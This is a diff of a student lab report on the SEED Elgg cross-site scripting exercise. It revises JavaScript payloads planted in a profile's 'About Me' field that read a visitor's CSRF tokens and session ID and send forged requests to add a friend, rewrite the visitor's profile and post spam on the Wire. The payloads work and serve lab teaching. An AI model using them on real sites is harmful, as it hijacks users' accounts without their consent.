@@ -70,31 +70,34 @@ Referer: http://www.seed-server.com/profile/charlie
 Cookie: Elgg=h3bdfki7sh3fb6bi9pk2msv20u
 \end{minted}
 
-We then check Samy's profile and find that his ID is 59. We want to ensure another thing. When Samy visits his own profile, he should not be a victim of his own attack. That means, we need some way to know what the ID of the current session owner is. We find out that this can be known from $elgg.session.user.guid$ .
+We then check Samy's profile and find that his ID is 59. We also want to ensure that Samy does not get vicim of his own attack should he ever visit his own profile. That means, we need to know what the ID of the current session owner is. We find out that this can be known from $elgg.session.user.guid$.
 
-We then place the following in Samy's ``About Me'' in HTML format.
+     \begin{figure}[H]
+         \centering
+         \includegraphics[width=\textwidth]{Images/ss6.png}
+         \caption{Current Session Owner Information}
+         \label{fig:ss6}
+     \end{figure}
 
-\begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{js}
+We then place the following in Samy's ``About Me'' in ``Edit HTML'' format:
+
+\begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{html}
 <script type="text/javascript">
     window.onload = function () {
         var Ajax=null;
-        // Time Stamp
-        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
-        // Security Token
-        var token= "&__elgg_token=" + elgg.security.token.__elgg_token;
-        // ID of Samy, the user to be added as friend
-        var addWhomID = 59;
-        // ID of the user who is viewing the profile with ID 'addWhomID'
-        var whoIsViewingID = elgg.session.user.guid;
+        var ts = elgg.security.token.__elgg_ts; // Time Stamp
+        var token= elgg.security.token.__elgg_token; // Security Token
+        var myID = 59; // User ID of the attacker (Samy)
+        var userID = elgg.session.user.guid; // ID of the visitor
 
-        // If the user is viewing his own profile, then the attack is not performed
-        if (whoIsViewingID == addWhomID) return;
+        // If Samy is visiting his own profile, no attack should happen
+        if (userID == myID) return;
 
-        var sendurl = `/action/friends/add?friend=${addWhomID}&__elgg_ts=${ts}elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;
+        var sendurl = `/action/friends/add?friend=${myID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;
 
-        //Create and send Ajax request to add friend
+        // Create and send Ajax request to add friend
         Ajax = new XMLHttpRequest();
-        // last boolean value is for asynchronous request making
+        // Last boolean value is for asynchronous request making
         Ajax.open("GET", sendurl, true);
         Ajax.setRequestHeader("Host", "www.seed-server.com");
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -102,8 +105,15 @@ We then place the following in Samy's ``About Me'' in HTML format.
 	}
 </script>
 \end{minted}
-
-After this, when Alice visits Samy's profile, the attack is executed and this is the result:
+\newpage
+After this, when Alice visits Samy's profile, the attack is executed with the following request being sent:
+     \begin{figure}[H]
+         \centering
+         \includegraphics[width=\textwidth]{Images/ss7.png}
+         \caption{GET Request sent as a result of the attack}
+         \label{fig:ss7}
+     \end{figure}
+On reload, we can see that, Samy is now alice's friend.
      \begin{figure}[H]
          \centering
          \includegraphics[width=\textwidth]{Images/ss1.png}
@@ -150,17 +160,17 @@ The content in the image is the following:
 
 So, basically content is the concatenated form of all the attributes. We can use this directly in the following way:
 
-\begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{js}
+\begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{html}
 <script type="text/javascript">
 	window.onload = function() {
-	    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-	    var token="&__elgg_token="+elgg.security.token.__elgg_token;
-	    var name=elgg.session.user.name;
+	    var ts=elgg.security.token.__elgg_ts;
+	    var token=elgg.security.token.__elgg_token;
+	    var userName=elgg.session.user.name;
 	    var guid=elgg.session.user.guid;
         var sendurl='/action/profile/edit';
-	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=${name}&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
+	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=Kim Jong Un&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
 
-        if(name!="Samy")
+        if(guid != 59)
         {
             var Ajax=null;
             Ajax=new XMLHttpRequest();
@@ -177,7 +187,7 @@ So, basically content is the concatenated form of all the attributes. We can use
 This yields the expected results.\newline
 But there is a more elegant solution, through Form Data. We end up using that.
 
-\begin{minted}[breakanywhere=true,breaklines=true,tabsize=2]{js}
+\begin{minted}[breakanywhere=true,breaklines=true,tabsize=2]{html}
 <script type="text/javascript">
     window.onload = function() {
         var ts = elgg.security.token.__elgg_ts;
@@ -186,14 +196,15 @@ But there is a more elegant solution, through Form Data. We end up using that.
         var guid = elgg.session.user.guid;
 
         var sendurl = "/action/profile/edit";
+        var myID = 59; // User ID of Samy
 
         // If the user is Samy, then the attack is not performed
-        if (name == "Samy") return;
+        if (guid == myID) return;
 
         var formData = new FormData();
         formData.append('__elgg_token', token);
         formData.append('__elgg_ts', ts);
-        formData.append('name', name);
+        formData.append('name', "Kim Jong Un");
         formData.append('description', '1905001');
         formData.append('accesslevel[description]', '1');
         formData.append('briefdescription', 'I am Samy, the worm. Catch me if you can.');
@@ -224,10 +235,15 @@ But there is a more elegant solution, through Form Data. We end up using that.
 </script>
 \end{minted}
 
-In any of the cases, we place the malicious script in Samy's ``About Me'' section like the previous task.
+In both the cases, we place the malicious script in Samy's ``About Me'' section's ``Edit HTML'' format like the previous task.
 
-Alice's profile is once again infiltred with the following consequences:
-
+So, Alice's profile is once again infiltred with the following consequences:
+     \begin{figure}[H]
+         \centering
+         \includegraphics[width=\textwidth]{Images/ss8.png}
+         \caption{POST Request sent as a result of the attack}
+         \label{fig:ss8}
+     \end{figure}
      \begin{figure}[H]
          \centering
          \includegraphics[width=\textwidth]{Images/ss3.png}
@@ -236,8 +252,10 @@ Alice's profile is once again infiltred with the following consequences:
      \end{figure}
 
 \newpage
+
+
 \section*{Task 3: Posting on the Wire on Behalf of the Victim}
-To get things going, we make a test post from Samy's profile. The following POST request is being made.
+To get things going, we make a test post from Samy's profile. The following POST request is made:
 
 \begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{html}
 POST /action/thewire/add HTTP/1.1
@@ -263,14 +281,14 @@ __elgg_token=un1KjOAjar7PKPaDSDuDfA&__elgg_ts=1707419569&body=Test Post
 
     \begin{figure}[H]
          \centering
-         \includegraphics[width=0.95\textwidth]{Images/ss4.png}
+         \includegraphics[width=\textwidth]{Images/ss4.png}
          \caption{POST Request for posing on the Wire}
          \label{fig:ss4}
      \end{figure}
 
-This task is quite similar to the previous one, in fact the request body is way shorter. So, we place this script in the ``About Me'' section once again.
+This task is quite similar to the previous one, in fact the request body is way shorter. So, we place this script in the ``About Me'' section once again:
 
-\begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{js}
+\begin{minted}[tabsize=2,breaklines=true,breakanywhere=true]{html}
 <script type="text/javascript">
     window.onload = function() {
         var ts = elgg.security.token.__elgg_ts;
@@ -281,7 +299,7 @@ This task is quite similar to the previous one, in fact the request body is way 
         var sendurl = "/action/thewire/add";
 
         // If the user is Samy, then the attack is not performed
-        if (name == "Samy") return;
+        if (guid == 59) return; // User ID of Samy
 
         var postBody = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy";
 
@@ -298,12 +316,17 @@ This task is quite similar to the previous one, in fact the request body is way 
     }
 </script>
 \end{minted}
-
+\newpage
 When Alice visits Samy's profile this time, a post is made from her profile without her knowing it.
-
     \begin{figure}[H]
          \centering
-         \includegraphics[width=0.9\textwidth]{Images/ss5.png}
+         \includegraphics[width=\textwidth]{Images/ss9.png}
+         \caption{POST Request as a result of the attack}
+         \label{fig:ss9}
+     \end{figure}
+    \begin{figure}[H]
+         \centering
+         \includegraphics[width=\textwidth]{Images/ss5.png}
          \caption{Wire post made from Alice's profile}
          \label{fig:ss5}
      \end{figure}
